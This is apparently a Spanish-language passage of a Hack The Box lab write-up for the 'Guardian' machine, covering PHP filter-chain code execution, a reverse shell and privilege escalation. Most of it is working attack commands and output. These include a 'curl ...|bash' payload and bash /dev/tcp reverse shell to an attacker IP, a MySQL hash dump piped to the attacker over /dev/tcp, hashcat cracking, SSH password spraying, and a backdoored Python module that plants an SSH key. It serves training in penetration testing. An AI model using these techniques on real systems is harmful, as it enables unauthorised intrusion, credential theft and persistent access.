.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Añadiremos esta cadena de filtros en el parámetro `report` en la `URL` de la sección `Reports` . 

> Para bypassear las protecciones, cambiaremos el final de la cadena en el parámetro `resource` por un archivo que el servidor acepte como válido, el cual ahora vale `php://temp` por algun archivo permitido, como `reports/enrollment.php`.
{: .notice--danger}

Cuando carguemos la web con esa nueva solicitud, veremos la salida del comando, en este caso `id`

![image-center](/assets/images/posts/guardian-26-hackthebox.png)
{: .align-center}


## Shell as `www-data`

Habiendo validado la ejecución de código `PHP`, podemos modificar el comando para que ejecute una reverse shell y así ganar acceso al servidor web.

> En este caso opté por utilizar una solicitud `HTTP` hacia mi servidor y ejecutar un recurso con `bash`.
{: .notice}

Decidí lanzar una shell desde el siguiente recurso llamado `rev`, además me aseguré de tener mi servidor `HTTP` a la escucha y con este recurso en el directorio de trabajo: `python3 -m http.server 80`

``` bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.4/443 0>&1"' > rev  
```

Procederemos generando la nueva cadena de filtros `PHP` con el script

``` bash
uv run php_filter_chain_generator.py --chain '<?php system("curl http://10.10.14.4/rev|bash"); ?>' 
[+] The following gadget chain will generate the following code : <?php system("curl http://10.10.14.4/rev|bash"); ?> (base64 value: PD9waHAgc3lzdGVtKCJjdXJsIGh0dHA6Ly8xMC4xMC4xNC40L3JldnxiYXNoIik7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16
<SNIP>
```

> Además, iniciaremos un listener con `netcat` que se encargue de recibir la shell por el puerto que especificamos, en mi caso el `443`: `nc -lvnp 443`.
{: .notice--danger}

Al enviar una solicitud con la nueva cadena de filtros, recibiremos una solicitud `HTTP` proveniente desde la máquina víctima hacia el recurso `rev` (o como lo llames tú)

``` bash
::ffff:10.129.237.248 - - [20/May/2026 15:57:14] "GET /rev HTTP/1.1" 200 -
```

De forma inmediata, en nuestro listener de `netcat` recibiremos una consola como el usuario `www-data`

``` bash
Connection from 10.129.237.248:41038
bash: cannot set terminal process group (1148): Inappropriate ioctl for device
bash: no job control in this shell
www-data@guardian:~/portal.guardian.htb/admin$ whoami                  
whoami
www-data
```

### TTY Treatment

Realizaremos un tratamiento de esta shell con el fin de lograr una consola más interactiva y estable (`Full TTY`). Esto lo hacemos con motivos de comodidad además de no perder la conexión

``` bash
www-data@guardian:~/portal.guardian.htb/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@guardian:~/portal.guardian.htb/admin$ ^Z # Press Ctrl+Z
[1]  + 10242 suspended  nc -lvnp 443

╭─ andrees@HackBookPro ~/.e/w/hackthebox/labs/machines/guardian/exploits/php_filter_chain_generator main
╰─ $ stty raw -echo;fg
[1]  + 10242 continued  nc -lvnp 443
                                    reset xterm
www-data@guardian:~/portal.guardian.htb/admin$ export TERM=xterm
www-data@guardian:~/portal.guardian.htb/admin$ stty rows 45 columns 139
```


## System Enumeration

Una vez dentro, antes de lanzar herrmientas para automatizar la enumeración, podemos optar por algo menos invasivo y enumerar el sistema manualmente

### Users

En mi caso me gusta comenzar enumerando ususarios válidos del sistema usando el siguiente comando

``` bash
www-data@guardian:~/portal.guardian.htb/admin$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jamil:x:1000:1000:guardian:/home/jamil:/bin/bash
mark:x:1001:1001:ls,,,:/home/mark:/bin/bash
gitea:x:116:123:Git Version Control,,,:/home/gitea:/bin/bash
sammy:x:1002:1003::/home/sammy:/bin/bash
```

### (Failed) Sudoers Privileges

Casi de forma inmediata, suelo listar privilegios `sudo`. Posiblemente existan configuraciones que permitan ejecutar recursos al usuario sin necesidad de proporcionar su contraseña

### Internally Open Ports

Podemos listar puertos abiertos internamente, estos no serán visibles debido a que solamente se abren en la interfaz `localhost`

``` bash
www-data@guardian:~/portal.guardian.htb/admin$ ss -tunl | grep LISTEN
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*          
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      128             [::]:22            [::]:* 
```

En este caso además de los puertos que vimos en la fase de reconocimiento, veremos algunos otros como el puerto `33060`, el `3000` y el `3306`.

> Puertos como el `33060` y el `3306` comúnmente corresponden al servicio `mysql`, esto nos brinda una gran pista sobre el motor de base de datos empleado en el servidor web.
{: .notice--info}

### MySQL Enumeration

Recordemos que anteriormente vimos las credenciales para conectarnos a la base de datos en el archivo `config/config.php` del repositorio en `Gitea`.

> Antes de conectarnos, debemos validar que exista el binario  de `mysql` en la máquina víctima: `which mysql`.
{: .notice--warning}

Nos conectaremos usando el siguiente comando de `mysql`

``` bash
www-data@guardian:~/portal.guardian.htb/admin$ mysql -u root -p'Gu4rd14n_un1_1s_th3_b3st'     
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3375
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Logramos acceder a la shell de `mysql`, ahora procederemos a enumerar las bases de datos

``` bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

Vemos que existe una base de datos llamada `guardiandb`, la cual no forma parte de las bases de datos estándar de `mysql`.

Cambiaremos a la base de datos `guardiandb` y enumeraremos las tablas

``` bash
mysql> use guardiandb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)
```

Lógicamente existe una tabla donde se guarda la información de los usuarios, en este caso la tabla `users`.

Opcionalmente podemos utilizar la sentencia  `describe` para mostrar la información sobre las columnas de esta tabla

``` bash
mysql> describe users;
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
| Field         | Type                               | Null | Key | Default           | Extra                                         |
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
| user_id       | int                                | NO   | PRI | NULL              | auto_increment                                |
| username      | varchar(255)                       | YES  | UNI | NULL              |                                               |
| password_hash | varchar(255)                       | YES  |     | NULL              |                                               |
| full_name     | varchar(255)                       | YES  |     | NULL              |                                               |
| email         | varchar(255)                       | YES  |     | NULL              |                                               |
| dob           | date                               | YES  |     | NULL              |                                               |
| address       | text                               | YES  |     | NULL              |                                               |
| user_role     | enum('student','lecturer','admin') | YES  |     | student           |                                               |
| status        | enum('active','inactive')          | YES  |     | active            |                                               |
| created_at    | timestamp                          | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED                             |
| updated_at    | timestamp                          | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP |
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
11 rows in set (0.00 sec)
```

Sabemos que existen las columnas `username` y `password_hash`, en este caso solamente necesitaremos consultar esta información de la tabla

``` bash
mysql> select username, password_hash from users;
+--------------------+------------------------------------------------------------------+
| username           | password_hash                                                    |
+--------------------+------------------------------------------------------------------+
| admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 |
| jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 |
| mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e |
| valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 |
| leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 |
| perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 |
| cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 |
| sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 |
| crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 |
| myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 |
| mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 |
| vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a |
| GU0142023          | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 |
| GU6262023          | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f |
| GU0702025          | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 |

<SNIP>
```

La consulta muestra muchos registros. Opcionalmente, podemos ejecutar esta sentencia desde fuera de la shell de `mysql` y enviar estos datos a nuestra máquina usando un socket `TCP` o simplemente copiándola

``` bash
# Attacker machine
nc -lvnp 4444 > users.txt

# Victim
www-data@guardian:~/portal.guardian.htb/admin$ mysql -u root -p'Gu4rd14n_un1_1s_th3_b3st' -B -e "SELECT username,password_hash from guardiandb.users;" > /dev/tcp/10.10.14.4/4444
```

- `-B`: Formato de salida ideal para comandos como `grep`, `awk`, etc.

Una vez hayamos recibido el archivo en nuestra máquina, podemos realizar un tratamiento rápido utilizando `pipes`

``` bash
cat users.txt | sed '1d' | tr '\t' ':' | sponge users.txt; head users.txt 
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250
mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e
valentijn.temby:1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6
leyla.rippin:7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61
perkin.fillon:4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471
cyrus.booth:23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6
sammy.treat:c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2
crin.hambidge:9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75
myra.galsworthy:ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4
```


## Hash Cracking

Podemos ver cómo se almacenan las contraseñas desde el código fuente, concretamente en el archivo `admin/createuser.php` desde la línea `40`

``` php
$password = hash('sha256', $password . $salt);

        $data = [
            'username' => $username,
            'password_hash' => $password,
            'full_name' => $full_name,
            'email' => $email,
            'dob' => $dob,
            'address' => $address,
            'user_role' => $user_role
        ];
```

En este caso las contraseñas se almacenan en la base de datos usando la función `hash()`, empleando el algoritmo `sha256`, usando un `salt` (`8Sb)tM1vs1SS`).

Así que volveremos a realizar un tratamiento de los datos para incluir ese campo faltante

``` bash
cat users.txt | sed 's/$/:8Sb)tM1vs1SS/' | cut -d ':' -f2-3 | tee hashes.txt
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6:8Sb)tM1vs1SS
7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61:8Sb)tM1vs1SS
4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471:8Sb)tM1vs1SS
23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6:8Sb)tM1vs1SS
c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS
9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75:8Sb)tM1vs1SS
ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4:8Sb)tM1vs1SS
18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3:8Sb)tM1vs1SS
b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a:8Sb)tM1vs1SS
5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829:8Sb)tM1vs1SS

<SNIP>
```

Rste modo de almacenamiento no será gran problema a la hora de intentar crackear estos hashes, el modo a emplear se encuentra en la documentación de[`hashcat`](https://hashcat.net/wiki/doku.php?id=example_hashes#:~:text=1410)

``` bash
hashcat -m 1410 hashes.txt /usr/local/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

<SNIP>

Watchdog: Temperature abort trigger set to 100c

Host memory allocated for this attack: 512 MB (1659 MB free)

Dictionary cache hit:
* Filename..: /usr/local/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
```


## Password Spraying

Hemos podido crackear dos hashes, ahora podemos intentar usar estas contraseñas para verificar si son válidas para algún usuario

``` bash
nxc ssh guardian.htb -u users.txt -p passes.txt --continue-on-success
SSH         10.129.237.248  22     guardian.htb     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.237.248  22     guardian.htb     [+] jamil:copperhouse56  Linux - Shell access!
SSH         10.129.237.248  22     guardian.htb     [-] mark:copperhouse56
SSH         10.129.237.248  22     guardian.htb     [-] sammy:copperhouse56
SSH         10.129.237.248  22     guardian.htb     [-] gitea:copperhouse56
SSH         10.129.237.248  22     guardian.htb     [-] mark:fakebake000
SSH         10.129.237.248  22     guardian.htb     [-] sammy:fakebake000
SSH         10.129.237.248  22     guardian.htb     [-] gitea:fakebake000
```


## Shell as `jamil`

El acceso con las credenciales `jamil`:`copperhouse56` es válido frente al protocolo `SSH`. Ahora podremos conectarnos utilizándolas

``` bash
sshpass -p 'copperhouse56' ssh -oStrictHostKeyChecking=no jamil@guardian.htb
Warning: Permanently added 'guardian.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

<SNIP>

Last login: Wed May 20 22:00:25 2026 from 10.10.14.4
jamil@guardian:~$ export TERM=xterm
jamil@guardian:~$ 
```

Ya podremos ver la flag del usuario sin privilegios elevados

``` bash
jamil@guardian:~$ ls
user.txt
jamil@guardian:~$ cat user.txt 
5df...
```
<br>



# Escalada de Privilegios
---
## Abusing Sudoers Privileges - Custom Python Script

Al listar los privilegios a nivel de `sudoers`, notaremos que el usuario `jamil` puede ejecutar un script de `pyhton` como el usuario `mark` sin tener que usar su contraseña

``` bash
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

El script necesita permite elegir una de las siguientes opciones al usuario

``` bash
jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py
usage: utilities.py [-h] {backup-db,zip-attachments,collect-logs,system-status}
utilities.py: error: the following arguments are required: action
```

Si vemos el comienzo del script, vemos que importa unas cuantas liberías desde `utils`, la cual no parece ser una libería estándar de `python`

``` bash
jamil@guardian:~$ head /opt/scripts/utilities/utilities.py
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status
```

`utils`existe como directorio en `/opt/scripts/utilities`

``` bash
jamil@guardian:~$ ls -la /opt/scripts/utilities/            
total 20
drwxr-sr-x 4 root admins 4096 Jul 10  2025 .
drwxr-xr-x 3 root root   4096 Jul 12  2025 ..
drwxrws--- 2 mark admins 4096 Jul 10  2025 output
-rwxr-x--- 1 root admins 1136 Apr 20  2025 utilities.py
drwxrwsr-x 2 root root   4096 Jul 10  2025 utils
```

Respecto al directorio `utils`, existe un script donde el grupo `admins` tiene permisos de escritura sobre él

``` bash
jamil@guardian:~$ ls -la /opt/scripts/utilities/utils
total 24
drwxrwsr-x 2 root root   4096 Jul 10  2025 .
drwxr-sr-x 4 root admins 4096 Jul 10  2025 ..
-rw-r----- 1 root admins  287 Apr 19  2025 attachments.py
-rw-r----- 1 root admins  246 Jul 10  2025 db.py
-rw-r----- 1 root admins  226 Apr 19  2025 logs.py
-rwxrwx--- 1 mark admins  253 Apr 26  2025 status.py
```

Afortunadamente, `jamil` forma parte del grupo `admins`, por lo que puede editar el contenido del script `status.py`

``` bash
jamil@guardian:~$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
```

### Abusing Write Permissions

El script `status.py` está siendo importado por el script que podemos ejecutar usando `sudo`. 

En el código del script `utilities.py`, ejecutamos la función `system_status` de `status.py` en la siguiente condición `elif`

``` python
<SNIP>

    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

La estrategia consiste en modificar la función `system_status()` del script `status.py` para ejecutar lo que nosotros estimemos conveniente. Ya sea una reverse shell, persistencia usando una clave `ssh`, una copia del binario `bash` con el bit `SUID`, etc.

> En mi caso establecí persistencia usando un par de claves `SSH` generado desde mi máquina atacante.
{: .notice--warning}

``` bash
ssh-keygen -t ed25519 -f mark 
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in mark
Your public key has been saved in mark.pub
The key fingerprint is:
SHA256:2OMneYPPUzP3xDBr86YPCT5mLXcDD7ttuv8ddfaNaJA incommatose@exegol
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|                 |
|       o   .  o  |
|      . S E .o =+|
|       . + o++X+B|
|        = +.O**O+|
|         *.= +o+B|
|          o. +**=|
+----[SHA256]-----+
```

Modificaremos el script `status.py` para que ejecute el comando que queramos a nivel de sistema.

> Como estoy intentando ganar persistencia a través de un par de claves `SSH`, necesito que el comando a ejecutar envíe mi clave pública al archivo `authorized_keys` del usuario `mark`, dentro de su directorio `.ssh`.
{: .notice--warning}

``` python
import psutil
import os

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    os.system('mkdir /home/mark/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDuTKVlAFSmiSSMaF/wj/g6PSI/Y7utiApl/i0HsLSJn incommatose@exegol" > /home/mark/.ssh/authorized_keys')
```


## Shell as `mark`

Ahora ejecutaremos el script con `sudo -u mark`, seguido de la opción `system-status` para gatillar la ejecución de nuestro script modificado

``` bash
jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
System: Linux 5.15.0-152-generic
CPU usage: 0.0 %
Memory usage: 31.9 %
```

Desde este momento debió haberse ejecutado el comando que autorizaba nuestra clave pública, por lo que intentaremos conectarnos como el usuario `mark` por `ssh` usando nuestra nueva clave privada

``` bash
ssh -i mark -oStrictHostKeyChecking=no mark@guardian.htb 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

<SNIP>

Last login: Wed May 20 22:12:56 2026 from 10.10.14.4
mark@guardian:~$ whoami
mark
mark@guardian:~$ export TERM=xterm # Ctrl+L shortcut
```


## Abusing Sudoers Privileges - Custom Binary

Ahora que somos el usuario `mark`, bastará el comando `sudo -l` para nuevamente ver privilegios `sudoers` configurados para este usuario

``` bash
mark@guardian:~$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

`mark` puede ejecutar una herramienta llamada `safeapache2ctl`, la cual luego de una búsqueda en internet, parece ser una herramienta personalizada, y aparentemente basada en la herramienta `apache2ctl`, posiblemente actúe como un `wrapper`.

> `Apache2ctl` es la interfaz de control y administración para el servidor web `Apache2` en sistemas basados en `Debian` y `Ubuntu`. 
> 
> Permite a los administradores gestionar el funcionamiento del servidor, verificar configuraciones y monitorear su estado directamente desde la terminal.
{: .notice--info}

Al ejecutarla, obtendremos el menú de uso, donde podemos especificar un archivo con el parámetro `-f`

``` bash
mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl
Usage: /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
```

Al crear un archivo cualquiera y volver a ejecutar la herramienta, obtendremos un error de `apache`

``` bash
mark@guardian:~$ echo 'whoami > /tmp/test.txt' > confs/test.conf
mark@guardian:~$ sudo safeapache2ctl -f confs/test.conf 
AH00534: apache2: Configuration error: No MPM loaded.
Action '-f /home/mark/confs/test.conf' failed.
The Apache error log may have more information.
```

> `MPM` son las siglas de Módulo de Multiprocesamiento (`Multi-Processing Module`) en el servidor web Apache. 
> 
> Son los componentes encargados de controlar cómo el servidor escucha la red, gestiona las conexiones entrantes y asigna los procesos o hilos necesarios para atender cada petición de los usuarios.
{: .notice--info}

Podemos listar los módulos disponibles desde la ruta `/etc/` y desde `/usr/lib/apache2/modules/`. 

Si queremos incluir algún módulo, podemos incluir directamente un módulo `.so` desde `/usr/lib/apache2/modules/`

``` bash
mark@guardian:~$ ls -la /etc/apache2/mods-available/ | grep mpm
-rw-r--r-- 1 root root   668 Mar 18  2024 mpm_event.conf
-rw-r--r-- 1 root root   106 Mar 18  2024 mpm_event.load
-rw-r--r-- 1 root root   571 Mar 18  2024 mpm_prefork.conf
-rw-r--r-- 1 root root   108 Mar 18  2024 mpm_prefork.load
-rw-r--r-- 1 root root   836 Mar 18  2024 mpm_worker.conf
-rw-r--r-- 1 root root   107 Mar 18  2024 mpm_worker.load

mark@guardian:~$ ls -la /usr/lib/apache2/modules/mod_mpm_*
-rw-r--r-- 1 root root 76144 Aug 11  2025 /usr/lib/apache2/modules/mod_mpm_event.so
-rw-r--r-- 1 root root 39280 Aug 11  2025 /usr/lib/apache2/modules/mod_mpm_prefork.so
-rw-r--r-- 1 root root 51568 Aug 11  2025 /usr/lib/apache2/modules/mod_mpm_worker.so
```

Intentaremos cargar el módulo para ver el comportamiento del binario usando la siguiente configuración

``` bash
mark@guardian:~$ cat confs/test.conf 
LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so
```

Al hacer la prueba, no obtendremos nada útil

``` bash
mark@guardian:~$ sudo safeapache2ctl -f ./confs/test.conf
Terminated
Action '-f /home/mark/confs/test.conf' failed.
The Apache error log may have more information.
```

### Binary Decompile

En este punto podemos intentar hacer reversing para ver cómo funciona este binario por dentro.

Copiaremos el binario en nuestra máquina usando `scp` (`Secure Copy`)

``` bash
scp -i mark -oStrictHostKeyChecking=no mark@guardian.htb:/usr/local/bin/safeapache2ctl .    
safeapache2ctl  
```

Como tengo una pc de mierda, opté por usar el siguiente [sitio web](https://dogbolt.org/) que permite descompilar rápidamente binarios y puede sacarnos de un apuro.

El siguiente fragmento corresponde a la función `main()` del binario

``` c
<SNIP>

if ( argc == 3 && !strcmp(argv[1], "-f") )
  {
    if ( realpath(argv[2], resolved) )
    {
      if ( starts_with(resolved, "/home/mark/confs/") )
      {
        stream = fopen(resolved, "r");
        if ( stream )
        {
          while ( fgets(s, 1024, stream) )
          {
            if ( (unsigned int)is_unsafe_line((__int64)s) )
            {
              fwrite("Blocked: Config includes unsafe directive.\n", 1u, 0x2Bu, stderr);
              fclose(stream);
              return 1;
            }
          }
          fclose(stream);
          execl("/usr/sbin/apache2ctl", "apache2ctl", "-f", resolved, 0);
          perror("execl failed");
          return 1;
        }
        else
        {
          perror("fopen");
          return 1;
        }
      }
      else
      {
        fprintf(stderr, "Access denied: config must be inside %s\n", "/home/mark/confs/");
        return 1;
      }
    }
    else
    {
      perror("realpath");
      return 1;
    }
  }
  else
  {
    fprintf(stderr, "Usage: %s -f /home/mark/confs/file.conf\n", *argv);
    return 1;
  }
}

<SNIP>
```

Se aceptan dos argumentos, el primero, un argumento `-f` y el segundo, una ruta a un archivo `.conf`.

- El binario usa la función `realpath()` para resolver la ruta (relativa o absoluta) del archivo de configuración, validando que esté en `/home/mark/confs/`.
- Lee cada línea del archivo `.conf` y evalúa una condición usando la función `is_unsafe_line()`.
- Si la condición retorna verdadero (o `1`), arroja un error indicando que el archivo contiene directivas inseguras.

Inspeccionemos la función `is_unsafe_line()` para ver cómo el binario valida las directivas en el archivo de configuración

``` c
__int64 __fastcall is_unsafe_line(__int64 a1)
{
  char s1[32]; // [rsp+10h] [rbp-1030h] BYREF
  char v3[16]; // [rsp+30h] [rbp-1010h] BYREF
  unsigned __int64 v4; // [rsp+1038h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( (unsigned int)__isoc99_sscanf(a1, "%31s %1023s", s1, v3) != 2 )
    return 0;
  if ( strcmp(s1, "Include") && strcmp(s1, "IncludeOptional") && strcmp(s1, "LoadModule")
    || v3[0] != 47
    || starts_with(v3, "/home/mark/confs/") )
  {
    return 0;
  }
  fprintf(stderr, "[!] Blocked: %s is outside of %s\n", v3, "/home/mark/confs/");
  return 1;
}
```

La primer condición lee cada línea e intenta parsear dos palabras separadas por espacios. Si la línea no contiene exactamente dos palabras, o sea, está vacía o no tiene ese formato, retorna `0` y la deja pasar.

La segunda condición permite directivas como `Include`, `IncludeOptional` y `LoadModule`, sólo si la función `starts_with()` determina que la ruta comienza con `/home/marks/confs/`.

